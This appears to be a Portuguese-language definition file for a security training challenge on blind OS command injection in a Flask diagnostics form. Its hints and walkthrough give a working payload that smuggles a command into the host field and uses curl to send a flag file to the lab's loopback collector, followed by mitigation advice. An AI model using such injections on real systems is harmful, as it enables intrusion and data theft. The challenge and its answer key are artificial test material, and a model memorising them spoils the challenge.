@@ -1,0 +1,80 @@
+{
+  "slug": "server-blind-cmdi",
+  "title": "Resolver silencioso",
+  "codename": "PULSEGRID",
+  "summary": "O Pulsegrid enfileira verificações de host através de um shell, mas apenas confirma o pedido. Não há saída de comando na resposta, então a injeção precisa enviar sua evidência para um coletor.",
+  "category": "server",
+  "difficulty": "medium",
+  "kind": "challenge",
+  "lab_dir": "server-blind-cmdi",
+  "estimated_minutes": 22,
+  "xp": 210,
+  "tech": [
+    "Flask",
+    "subprocess",
+    "Shell"
+  ],
+  "tags": [
+    "command-injection",
+    "blind-cmdi",
+    "out-of-band"
+  ],
+  "story": "O worker do resolver do Pulsegrid foi movido para trás de uma fila para impedir que os operadores vissem a saída de rede bruta. O formulário ainda repassa a string do host para um shell. A service account consegue ler o arquivo de flag em `/tmp`, mas a página nunca vai mostrá-lo para você.",
+  "objective": "Injete um comando através do campo host do diagnóstico e exfiltre `/tmp/redvault-blind-cmdi-flag.txt` para o endpoint `/collect` do lab. Leia o valor capturado em `/captured`.",
+  "rules": "Atinja apenas o processo do Pulsegrid. Use o endpoint coletor do próprio lab; não contate sistemas externos.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Flag de execução cega de comando",
+      "flag_type": "hidden",
+      "points": 210,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Ausência de saída não significa ausência de execução",
+      "body": "O worker executa `getent hosts <host>` com um shell. Tente `127.0.0.1; sleep 3` e observe que a resposta demora. A saída é descartada, mas o segundo comando rodou.",
+      "cost": 10
+    },
+    {
+      "level": 2,
+      "title": "Construa um canal",
+      "body": "O lab expõe `/collect?c=` e `/captured`. Faça o comando injetado enviar o arquivo de flag para o coletor na mesma porta de loopback. Use `curl` dentro da substituição de comando.",
+      "cost": 20
+    },
+    {
+      "level": 3,
+      "title": "O payload de exfiltração",
+      "body": "Envie `127.0.0.1; curl -s http://127.0.0.1:<port>/collect?c=$(cat /tmp/redvault-blind-cmdi-flag.txt)`. Em seguida, faça GET `/captured`; o coletor armazena o valor e registra o objetivo.",
+      "cost": 25
+    }
+  ],
+  "solution": {
+    "walkthrough": "1. Envie `127.0.0.1` e confirme que a página apenas informa que o diagnóstico está na fila.\n2. Envie `127.0.0.1; sleep 2` e observe a resposta atrasada, provando a execução via shell.\n3. Envie `127.0.0.1; curl -s http://127.0.0.1:<port>/collect?c=$(cat /tmp/redvault-blind-cmdi-flag.txt)`.\n4. Faça GET `/captured` e leia a flag na caixa de entrada do coletor.\n\n```bash\ncurl -s -X POST http://127.0.0.1:PORT/ \\\n  --data-urlencode 'host=127.0.0.1; curl -s http://127.0.0.1:PORT/collect?c=$(cat /tmp/redvault-blind-cmdi-flag.txt)'\ncurl -s http://127.0.0.1:PORT/captured\n```",
+    "root_cause": "Command injection de sistema operacional em um caminho cego. O valor do host é interpolado em `getent hosts <host>` e executado com `shell=True`. Suprimir o stdout impede que o operador veja o resultado na UI, mas não impede que o comando injetado faça sua própria request de saída.",
+    "mitigation": "Use `shell=False` com um executável fixo e vetor de argumentos; valide o host contra uma gramática estrita de hostname/IP; rode o worker com privilégios mínimos e sem egress de rede exceto uma allowlist. Trate injeção cega como totalmente explorável e alerte sobre processos filhos inesperados."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — Blind OS command injection",
+      "url": "https://portswigger.net/web-security/os-command-injection",
+      "source_type": "official",
+      "description": "Técnicas out-of-band quando a saída do comando não é retornada."
+    },
+    {
+      "title": "OWASP Command Injection Defenses",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Como evitar shells e validar os argumentos dos comandos."
+    },
+    {
+      "title": "CWE-78 — OS Command Injection",
+      "url": "https://cwe.mitre.org/data/definitions/78.html",
+      "source_type": "standard",
+      "description": "Definição da fraqueza, consequências e mitigações."
+    }
+  ]
+}
